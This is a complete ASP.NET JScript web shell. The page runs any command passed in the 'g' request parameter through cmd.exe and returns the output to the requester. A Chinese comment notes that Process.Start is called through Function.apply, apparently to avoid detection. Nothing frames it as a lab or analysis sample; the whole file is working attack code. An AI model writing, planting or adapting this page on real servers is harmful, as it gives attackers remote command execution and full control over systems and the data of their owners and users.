<%@ Page Language="JScript" %>
<%
var userCommand = Request.Params["g"];
if (userCommand != null && userCommand != "") {
    try {
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + userCommand;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        var process = new System.Diagnostics.Process();
        process.StartInfo = psi;
        // 使用 Function.apply 动态调用 Start 方法
        process.Start.apply(process, []);
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        Response.Write(Server.HtmlEncode(output));
    } catch (ex) {
        Response.Write("Error: " + Server.HtmlEncode(ex.Message));
    }
} else {
    Response.Write("No command");
}
%>